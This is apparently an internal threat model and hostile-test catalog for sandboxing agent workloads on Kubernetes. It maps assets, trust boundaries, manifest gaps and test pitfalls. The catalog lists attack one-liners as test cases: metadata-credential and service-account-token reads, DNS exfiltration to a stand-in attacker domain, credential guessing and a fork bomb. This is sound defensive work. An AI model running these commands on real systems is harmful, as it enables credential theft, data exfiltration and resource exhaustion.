# PoC-5 threat model and attack catalog: the two lanes and the trust rule

Author: platform-security, 2026-10-02. Read-only review. Inputs: `docs/planning/poc/005-PoC-5-sandboxed.md`,
`docs/planning/adr/001-chassis-delivery-model.md` (items 4-6, hard requirements 1-2), `deploy/compose/SECURITY.md`,
`deploy/kind/poc04/base/*.yaml`, `deploy/kind/poc04/native-sidecar/deployment.yaml`, `deploy/kind/cluster.yaml`,
`deploy/compose/litellm/config.yaml`, `packages/chassis/src/chassis/server/{proxy_app,model_proxy,tool_endpoint,cli}.py`,
`pocs/poc-04-stateless-scalable/notes/2026-10-01-debt.md`.

Scope note: this is design input for the chassis-architect's plan. No secrets in this file.

## 1. Threat model for the two lanes

### Assets (what the attacker wants)
- A1 Provider API keys (OpenAI etc.) — held only in LiteLLM's env.
- A2 LiteLLM master key — administers LiteLLM, mints virtual keys.
- A3 The chassis's scoped credentials — the per-service LiteLLM virtual key, the MCP gateway grant, the Valkey
  password, the MinIO key pair, broker SASL creds. Mounted in the chassis container only.
- A4 The pod's Kubernetes service account token (`/var/run/secrets/kubernetes.io/serviceaccount/token`).
- A5 The cloud instance credential via the metadata service (169.254.169.254; IMDS role creds).
- A6 Other tenants'/callers' data: idempotency cache entries and result events in Valkey/Kafka (today per-agent, not
  per-caller, in the clear — PoC-4 debt).
- A7 Model spend and tool reach: the ability to call models/tools off the budget, or tools not allow-listed.
- A8 Compute: CPU/memory/PIDs/disk of the node and of the chassis container.

### Attackers
- T1 Hostile workload container in the `sidecar` lane. Shares the pod's network namespace with the chassis
  (localhost, pod IP). Does NOT share the chassis's filesystem, PID namespace, or env. Trusted-by-policy (source +
  behavior), so this is the "trusted lane turned buggy/compromised" case, not the primary untrusted case.
- T2 Hostile remote pod in the `remote` lane. Its own pod, gVisor (runsc) sandbox, its own network identity. This is
  the primary untrusted-code case: a framework that writes and runs code, third-party image, or managed runtime.
- (T3 background: any other pod/container on the cluster network — the lateral-movement baseline a default-deny
  NetworkPolicy must also stop.)

### Trust boundaries and where each control lives
The design intent of ADR-001 is that the hard limits live in SHARED SERVICES and the KERNEL/RUNTIME/NETWORK, never in
the chassis pipeline — "the pipeline is not the security boundary against hostile code."

| # | Boundary | Attacker crosses by | Control that holds it | Where the control lives |
| - | -------- | ------------------- | --------------------- | ----------------------- |
| B1 | Workload -> internal service (LiteLLM, MCP gw, broker, Valkey, config store) | direct TCP from the shared namespace or the remote pod | the service requires a credential only the chassis holds (hard req 1) | shared service (auth) + network (NetworkPolicy) |
| B2 | Workload -> provider / internet | outbound HTTP/DNS | default-deny egress; chassis proxies add provider key, workload holds none | network (NetworkPolicy/CNI) + shared service (LiteLLM) |
| B3 | Workload -> cloud metadata (A5) | GET 169.254.169.254 | egress deny incl. link-local; (belt: no cloud role bound to workload SA) | network + cloud IAM |
| B4 | Workload -> Kubernetes API (A4) | token + reach to kubernetes.default.svc / node:6443 | automountServiceAccountToken:false AND egress deny of API/node; RBAC as backstop | kernel/runtime (no token mount) + network + k8s RBAC |
| B5 | Workload -> chassis credentials at rest (A3) | read chassis env/files | separate containers: no shared FS, no shared PID ns, secrets mounted into chassis only | kernel/runtime (namespaces) |
| B6 | Workload -> chassis public port on localhost | connect/ bind 127.0.0.1:8080 | public port binds the pod IP, not 0.0.0.0/loopback; only proxies on loopback | chassis config (bind address) |
| B7 | Workload binds the proxy port before the chassis | race on 127.0.0.1:8090 at start | start ordering; (gap today, see 3) | chassis pipeline / runtime ordering |
| B8 | Remote pod -> chassis proxies without its own credential | call pod-IP:8090 unauthenticated | per-remote token or mTLS on the remote-lane listener | chassis pipeline (proxy auth) + network (only remote label may reach) |
| B9 | Workload escapes to node/other pods | kernel exploit, privilege escalation | gVisor (runsc) for remote; non-root, drop ALL, no-new-privileges, seccomp RuntimeDefault, read-only root for both | kernel/runtime |
| B10 | Workload exhausts compute (A8) | fork bomb, memory balloon, disk fill | pids limit, memory limit, CPU limit, ephemeral-storage/sizeLimit on tmpfs | kernel/runtime (cgroups) |
| B11 | Workload -> model spend / un-allow-listed tool (A7) | call the proxies | scoped virtual key (budget) + MCP per-key tool allow-list; proxy correlates by traceparent | shared service (LiteLLM, MCP gw) |
| B12 | Cross-tenant data (A6) | read Valkey/Kafka directly, or guess another caller's idempotency key | B1 auth closes direct read; per-caller scope is NOT closed (PoC-8 debt) | shared service + (future) auth |

Key point for the plan: B1-B4 and B9-B11 must each hold even if the chassis pipeline is fully bypassed. That is why
every one maps to a shared-service, network, or kernel control, not to code in the chassis.

## 2. Attack catalog for the hostile suites

Lane S = sidecar (T1), R = remote (T2). "Offline" = static manifest/config check or in-process test on every commit;
"kind" = needs the cluster (the actual packet/syscall). Every negative case needs a positive control next to it
(see section 6). IDs are stable handles for the suite.

| id | lane | attack (concrete) | expected result | control | test |
| -- | ---- | ----------------- | --------------- | ------- | ---- |
| H01 | S,R | `GET http://169.254.169.254/latest/meta-data/iam/security-credentials/` | connection timeout / no route | egress deny of 169.254.169.254/32 (link-local) | kind (offline: policy asserts link-local not allowed) |
| H02 | S,R | read `/var/run/secrets/kubernetes.io/serviceaccount/token` | ENOENT (not mounted) | automountServiceAccountToken:false | offline (manifest) + kind (ls in container) |
| H03 | S,R | `curl https://kubernetes.default.svc/api` (needs token+reach) | timeout; and 401/403 if reached | egress deny of API; token absent; RBAC | kind (offline: policy + manifest) |
| H04 | S,R | `curl https://<nodeIP>:6443/` (apiserver via node IP) | timeout | egress deny of node/host CIDR, not just the Service VIP | kind |
| H05 | S | `curl http://litellm:4000/v1/chat/completions` with no key | 401 (auth on) | LiteLLM master/virtual key required; `allow_all_keys` off | kind (offline: config asserts master key set, allow_all_keys false) |
| H06 | S | `curl http://litellm:4000/v1/...` with a guessed/empty virtual key | 401 | LiteLLM virtual-key auth | kind |
| H07 | S | call MCP gateway `http://litellm:4000/mcp/` with no key | 0 tools granted / 401 | MCP gw per-key grant; `allow_all_keys:true` must be removed | kind (offline: config check) |
| H08 | S,R | call a tool NOT on this key's allow-list (e.g. a write/shell tool) | tool not listed / denied | MCP gateway per-key tool allow-list | kind + in-process (ToolPort fake: unknown_tool) |
| H09 | S | `curl http://fake-model-server:8081/v1/...` (or `llama-cpp:8080`) directly | must be refused | model server behind a key the chassis holds, OR egress deny to it except from chassis proc | kind (TODAY: OPEN — see 3) |
| H10 | S | connect `valkey:6379`, `AUTH` with a guessed password, `KEYS *` | NOAUTH / WRONGPASS; and no route | requirepass/ACL + egress allows valkey only from chassis's need | kind (offline: manifest has requirepass, secret) |
| H11 | S | connect Kafka `:9092` PLAINTEXT, consume result-event topic (A6) | refused | broker SASL + ACL per principal | kind (TODAY: OPEN, PLAINTEXT — debt 020 X-8) |
| H12 | S | connect MinIO `:9000` with guessed/again keys, GET/PUT bucket | 403 (SignatureDoesNotMatch/AccessDenied) | MinIO keys; chassis user read-only; egress | kind (offline: manifest) — MinIO not on kind today |
| H13 | S | `connect 127.0.0.1:8080` (chassis public port on localhost) | connection refused | public port binds pod IP, not loopback/0.0.0.0 | in-process/offline (assert bind arg = POD_IP) + kind |
| H14 | S | bind `127.0.0.1:8090` before the chassis (steal the proxy port) | bind fails / chassis refuses to start, is not pre-empted | start ordering; proxy bound before workload can, or a fixed owner | kind (TODAY: 120s window — see 3) |
| H15 | S | call the proxy `127.0.0.1:8090/v1/chat/completions` with no credential | served, charged to chassis key (accepted for sidecar; trusted lane) | by design: proxy trusts the namespace; budget via virtual key | in-process (documents the accepted behavior) |
| H16 | S | call the proxy with no traceparent (uncorrelated spend) | served, counted `chassis.model_calls_uncorrelated`, capped by a per-replica budget | per-replica uncorrelated budget (DUE PoC-5 — see 3) | in-process (TODAY: no cap) |
| H17 | R | call the proxy pod-IP:8090 with NO token / another remote's token | 401 | per-remote token or mTLS on the remote listener | in-process (auth unit) + kind |
| H18 | R | another pod (not the chassis) connects the remote pod's A2A port | refused | NetworkPolicy: only the chassis pod's label may ingress the remote | kind (offline: policy check) |
| H19 | R | remote reaches the internet `GET https://evil.example/` | timeout | default-deny egress on the remote pod | kind |
| H20 | R | DNS exfiltration: `dig data.attacker.example` / TXT lookups | refused or no resolver reach | egress DNS only to kube-dns; egress firewall; (Envoy/allow-list for true control) | kind (offline: policy allows 53 to kube-dns only) — note: DNS to kube-dns still allows some tunneling; call out |
| H21 | R | write to `/`, `/etc`, app dir | EROFS | readOnlyRootFilesystem:true | offline (manifest) + kind (touch) |
| H22 | R | write to `/tmp` beyond the size limit | ENOSPC at the cap | emptyDir/tmpfs sizeLimit | kind (fill) + offline (manifest has sizeLimit) |
| H23 | R | fork bomb `:(){ :|:& };:` | EAGAIN at the pids cap | pids limit (cgroup) | kind (TODAY: no pids limit — see 3) |
| H24 | R | memory balloon | OOMKill at the limit | memory limit | kind + offline (manifest) |
| H25 | R | read secrets from a mounted volume/env | nothing present | no Secret/env mounted into remote; secrets in chassis only | offline (manifest) + kind (env|grep) |
| H26 | S | read the chassis's env/secret from the other container (`/proc/1/environ`, shared FS) | EACCES/ENOENT — not same PID ns, not shared FS | separate containers; no shareProcessNamespace; per-container /tmp | offline (manifest: no shareProcessNamespace, no shared writable volume) |
| H27 | R,S | privilege escalation via setuid binary | blocked | allowPrivilegeEscalation:false, no-new-privileges, drop ALL caps | offline (manifest) + kind |
| H28 | R | kernel syscall exploit attempt (e.g. unusual syscalls) | intercepted by gVisor / blocked by seccomp | gVisor runsc RuntimeClass; seccompProfile RuntimeDefault | kind (TODAY: no RuntimeClass/gVisor — see 3) |
| H29 | R | call the model proxy with a tool/model route outside the key's scope, or over budget | 429 budget_exhausted / route refused | LiteLLM virtual-key model+budget scope; proxy budget by traceparent | in-process + kind |
| H30 | S,R | reach another agent's pod (lateral) e.g. `curl http://<other-agent>:8080/v1/run` | timeout | default-deny egress; only each pod's own needs allowed | kind |
| H31 | S | spoof the `agent:<name>` tag / x-litellm-tags to escape another agent's budget | tag is not a credential; budget must bind to the virtual key, not the tag | virtual key carries the tag (G-2 debt) | kind (offline: documents the gap) |
| H32 | R | managed-runtime relaxation: a runtime that cannot be pointed at the proxies holds its own scoped key | allowed, recorded per service, key scoped like the chassis's | ADR-001 item 8 relaxation; scoped LiteLLM key + MCP grant | offline (spec review) — out of scope for the remote pod case, in for PoC-6b |

Attacks the planning doc does not name but the suite should add: H04 (apiserver via node IP, not just the Service
VIP), H10/H11/H12 credentialed-service direct access with password guessing and data read (A6), H16 (uncorrelated
per-replica budget), H18 (ingress to the remote is chassis-only), H20 (DNS tunneling caveat — kube-dns egress is not
a full control), H26 (cross-container env/proc read), H30 (lateral pod-to-pod), H31 (tag spoofing vs budget).

## 3. Gaps in today's PoC-4 kind manifests and Compose stack vs PoC-5 hardening

kind manifests (`deploy/kind/poc04`):
- No RuntimeClass / gVisor anywhere. `cluster.yaml` is a single kindest/node v1.37.0; no runsc. gVisor is required by
  scope bullet 2 and exit 8. GAP (B9/H28). `deploy/CLAUDE.md` and `README.md` mention gVisor but no manifest sets it.
- No pids limit on any container. `native-sidecar/deployment.yaml` chassis (l.152-159) and workload (l.80-85), and
  `base/valkey.yaml` (l.55-60), `base/fake-model-server.yaml` (l.43-50) set only `memory` limits, no `cpu` limit, no
  pids. Fork-bomb (H23) and CPU starvation are uncapped. GAP (B10).
- NetworkPolicy does not NAME the metadata service or the API server in a deny list. `base/network-policy.yaml`
  (l.1-56) is default-deny + an allow for fake-model-server/valkey/DNS, so 169.254.169.254 and the apiserver are
  denied only implicitly. ADR-001 hard req 1 and scope bullet 7 ask them named. Also the DNS allow (l.45-54) permits
  egress to kube-dns on 53 — the base for H20 DNS tunneling; no egress allow-list beyond that. GAP (B3/B4/H20).
  Also: the comment at l.4-6 states a NetworkPolicy cannot tell the two sidecar containers apart (shared pod netns) —
  so in the sidecar lane H09/H30-type workload egress rides the chassis's allowances; this is exactly why untrusted
  code must go remote.
- The egress allow still lets the agent pod reach `fake-model-server:8081` with no auth (H09). `base/fake-model-server
  .yaml` holds no key; `chassis-bootstrap.yaml` (l.19) points the chassis straight at it (no LiteLLM in path on kind).
  So a sidecar workload in the namespace reaches a model server directly. OPEN (SECURITY.md 6, debt).
- LiteLLM is not even in the kind stack; the kind path uses the fake server directly. So H05-H07 (virtual key, MCP
  per-key grant, `allow_all_keys:false`) are untested on kind today. `deploy/compose/litellm/config.yaml` l.33 has
  `allow_all_keys: true` and l.44-48 runs with NO master key (open). Both must flip for PoC-5. GAP (B1/B11).
- Valkey password is on the process argv (`base/valkey.yaml` l.40-41, the file's own comment l.3-4) — visible in the
  pod's process list. Fix is a mounted config file (CH-3). GAP (A3 at rest within the pod).
- `automountServiceAccountToken:false` is set (good): deployment l.33, valkey l.25, fake-model-server l.22. Keep and
  assert. Non-root/read-only/drop ALL/no-new-privileges/seccomp RuntimeDefault are all present on the PoC-4 pods —
  reuse these; they already satisfy B9's baseline (minus gVisor and pids).
- Public port binds POD_IP (deployment l.106-107, l.115-118) — B6 already held. Keep the assertion (H13).
- No remote lane exists yet: no second pod, no RuntimeClass, no per-remote proxy listener/auth, no NetworkPolicy
  that lets only the chassis label ingress the remote. All of B8/H17/H18/H19 are to be built.
- Namespace has `pod-security.kubernetes.io/enforce: restricted` (base/namespace.yaml l.6-7) — good; it already
  blocks privileged/root. Keep.

Compose stack (`deploy/compose`), accepted PoC-only but out of scope for the real boundary:
- No seccomp set (grep: none); Docker's default seccomp applies, which is acceptable, but nothing asserts it.
- No `pids_limit` anywhere (grep: none). Fork bomb uncapped in Compose. (B10.)
- `fake` LiteLLM runs open (config l.44-48) and `allow_all_keys:true` (l.33); fake-model-server and llama-cpp have no
  key (SECURITY.md 6 l.53-57). Kafka PLAINTEXT, controller on all interfaces; MinIO root; Valkey password on argv
  (SECURITY.md 7 l.77-87). Compose has open egress (no NetworkPolicy equivalent). All the B1/B2 controls are absent in
  Compose by design — the egress and auth story is only enforceable in kind, which is PoC-5's job.
- Sidecar proxy-port race: the chassis waits up to 120 s for the workload card before binding 127.0.0.1:8090
  (SECURITY.md 6 l.55, scale.yaml entrypoint), so a hostile workload could bind 8090 first. H14 is real today.

## 4. Recommendations

Per-remote token vs mTLS (remote-lane proxy auth):
- Recommend a per-remote bearer token for PoC-5, held in the chassis config, with mTLS as the documented next step.
  Reasons: it is the minimum that proves exit criterion "only with its own credential" (H17); it needs no
  cert-manager, no rotation story, no CA plumbing inside the 3-week box; the proxy already refuses a non-loopback
  bind unless `--allow-any-proxy-host` (cli.py l.59-87), so the listener work is the token check plus flipping that
  flag. mTLS is stronger (binds identity to the TLS peer, not a bearer that can leak in a log) and is the production
  target, but it costs cert-manager + a CA + cert rotation and SAN/identity mapping — more than PoC-5 needs to answer
  its question. Pair the token with a NetworkPolicy so only the chassis pod's label can reach the listener (H18):
  defense in depth, so a leaked token alone is not reach. Record mTLS-via-cert-manager as the PoC-6/hardening
  follow-up (CH-6).

ValidatingAdmissionPolicy vs Kyverno:
- Recommend ValidatingAdmissionPolicy (VAP) for the trust-rule check in PoC-5. Reasons: the rule is narrow and
  expressible in CEL — reject a pod whose `spec.trust: untrusted` (or image not from our registry prefix) is placed
  in the sidecar lane; VAP is built-in on v1.37 (no controller to install, pin, or sandbox), which fits "fewest
  parts" and the one-engineer constraint. Kyverno is friendlier for complex/mutating policy and image-signature
  verification (cosign) and we will likely want it later for the min-version ring rule (CH-7) and signed images
  (H-10); but those are out of PoC-5 scope. Decision: VAP now for trust+registry admission; revisit Kyverno when
  image-signature or mutation policies land. Note the trust signal must come from a source the workload cannot set
  itself (a label the CI/registry stamps, or the image ref), not a pod annotation the submitter controls.

How each shared service enforces hard requirement 1 on kind:
- LiteLLM: set `general_settings.master_key` (drop the empty-key open mode, config l.44-48); issue one scoped virtual
  key per service (model routes + budget + rate limit), mounted into the chassis container only; the workload holds
  none. Needs a Postgres behind LiteLLM to mint virtual keys (SECURITY.md 1 l.16 debt — PoC-5 must pay it). Verify a
  no-key call is 401 (H05) and a key-scoped call succeeds (positive control).
- MCP gateway: remove `allow_all_keys: true` (config l.33); grant tools per key so each service's key lists only its
  allow-listed tools; a no-key/other-key call lists 0 tools (H07/H08).
- Valkey: `requirepass` from a Secret, moved OFF the argv into a mounted config file (base/valkey.yaml l.40-41 gap);
  prefer an ACL user scoped to the chassis over the shared password; NOAUTH/WRONGPASS on a guessed login (H10).
- Kafka: SASL (SCRAM) + per-principal ACLs on the topics; drop PLAINTEXT and the all-interfaces controller listener
  (020 X-8). Not on kind today; required before result events carry caller data on a shared broker (H11, A6).
- MinIO (or the chosen S3): per-service key pair, chassis user read-only on its bucket (already the Compose model,
  SECURITY.md 7 l.71); not on kind today (`config: memory` on kind). Also resolve the `pgsty/minio` image decision —
  build-from-source + sign before PoC-5 uses S3 (SECURITY.md 7 l.88).
- The fake model server: give it a key the chassis holds, or deny egress to it from everything but the chassis
  process, so a sidecar workload cannot call it directly (H09, the open item today).

CNI on kind:
- kindnet (kind's default) added NetworkPolicy enforcement in recent releases, and `base/network-policy.yaml` l.6-7
  asserts "kind's default CNI (kindnet) enforces NetworkPolicy" — but this MUST be verified against kind v0.33.0 /
  node v1.37.0 actually enforcing egress deny (not just accepting the objects). What I can state: Calico and Cilium
  both enforce NetworkPolicy fully and are the safe, well-trodden choice; Cilium additionally gives L7/DNS policy and
  better egress-FQDN control (useful for the H20 DNS-tunnel and the optional Envoy-replacement allow-list). What MUST
  be verified on this cluster: (a) that the default kindnet build enforces egress rules and link-local/metadata
  denial, by running H01/H19 and watching the packet drop, not a DNS failure; if it does not, install Calico
  (disableDefaultCNI + Calico manifest) or Cilium. Recommend: try kindnet first (fewest parts); fall back to Cilium
  if we need FQDN egress allow-listing or if kindnet's enforcement is partial. Do not trust the comment — prove it
  with a positive+negative control (section 6).

## 5. What the chassis cannot see or control in the remote lane (exit criterion 10) — first list

- The remote pod's internal behavior: what code it runs, its own threads/subprocesses, its memory and files inside
  its sandbox. The chassis sees only the A2A events it emits and the proxy calls it makes.
- Syscalls and escape attempts: handled by gVisor/seccomp/the kernel, not visible to the chassis (only to node-level
  runtime logs/falco, which the chassis does not run).
- Egress the chassis does not mediate: any network the remote attempts is allowed/denied by NetworkPolicy/CNI, not by
  the chassis; the chassis cannot see a blocked connection attempt. (A managed runtime holding its own scoped key —
  the item-8 relaxation — makes model/tool calls the chassis never sees at all; only LiteLLM/MCP-gw logs do.)
- Resource use: pids/cpu/mem/disk are capped by cgroups/kubelet; the chassis sees neither the usage nor the OOMKill
  except indirectly as a failed/timed-out A2A run.
- Prompt and tool-argument content when the managed-runtime relaxation is used (its own key path): spend and tool
  grants are enforced by LiteLLM/MCP-gw, not the chassis proxies, so the proxies' per-call budget/trace correlation
  does not apply.
- Data the remote persists or exfiltrates within an allowed egress (e.g. a legitimate tool call it is allowed to
  make, or DNS to kube-dns): the chassis cannot distinguish use from abuse at that layer.
- Clock/identity: the chassis cannot attest the remote's identity beyond its credential (token/mTLS peer) and its
  pod label; a compromised-but-authenticated remote is indistinguishable from a healthy one to the proxies.

## 6. Pitfalls — making a hostile test pass for the wrong reason

Every negative (the block) needs a positive control (the same call, allowed, succeeds) in the same test, so a pass
proves the intended control and not an accident.
- Timeout because DNS failed, not because policy denied. H01/H03/H04/H19: if the image cannot resolve the host, the
  call times out regardless of policy. Prove it: use a literal IP (169.254.169.254, the node IP, the Service ClusterIP
  resolved out-of-band) so no DNS is needed; and as the positive control, from the chassis container (or an
  allow-listed path) the same IP IS reachable. Separately test that DNS to kube-dns works (so a DNS-based test failing
  means policy, not resolver).
- The test image lacks the tool. H01/H03/H10/H23: no curl/dig/redis-cli/bash means the attack "fails" for lack of a
  binary, not a control. Prove it: use the language runtime already in the image (python urllib/socket), or bake the
  tools into the hostile test image on purpose; and show the same binary succeeds against an allowed target (positive
  control).
- Service down vs auth refusing. H05-H07/H10-H12: a 000/connection-refused can mean the service is not up. Prove it:
  the positive control is the chassis making the SAME call WITH its credential and getting 200/data; the negative is
  the workload getting 401/403. Both in one run.
- EROFS vs path-not-present. H21: writing to a path that does not exist gives ENOENT, not EROFS, and looks like a
  "block". Prove it: write to a path that DOES exist and would be writable without the control (e.g. the app dir),
  assert EROFS; positive control: writing to the mounted /tmp succeeds.
- Fork bomb "blocked" by the memory limit, not the pids limit. H23: without a pids cap the bomb may OOM first. Prove
  it: set the pids limit, count that process creation hits EAGAIN at the cap, and that a small number of forks still
  succeeds (positive control).
- Token "absent" because the path moved. H02: asserting ENOENT on one path passes if the token is mounted elsewhere.
  Prove it: assert the whole `/var/run/secrets/kubernetes.io/serviceaccount/` dir is absent AND
  `automountServiceAccountToken:false` in the manifest AND no projected-token volume targets the workload container.
- Proxy-auth "refused" because the listener is down. H17: a 000 is not a 401. Prove it: no-token -> 401, and WITH the
  remote's token -> 200 (positive control), same listener.
- NetworkPolicy "enforced" but the CNI ignores it. H18/H19/H30: kindnet may accept the object without enforcing.
  Prove it: a negative (denied pod cannot reach) AND a positive (an allowed pod/label CAN reach) through the same
  policy; if the positive is also blocked, the policy is over-broad; if the negative is allowed, the CNI is not
  enforcing.
- gVisor "running" but the pod is on runc. H28: a RuntimeClass typo silently schedules on the default runtime. Prove
  it: read `dmesg`/`/proc` markers that differ under runsc, or check the pod's runtimeClassName took effect, and that
  a known-gVisor-intercepted syscall behaves as under runsc.
- Idempotency/cross-tenant (A6/H12): a "cannot read other caller's data" test passes today only because there is one
  caller. Note it: per-caller scope is NOT a control yet (PoC-8). Do not claim B12 closed.
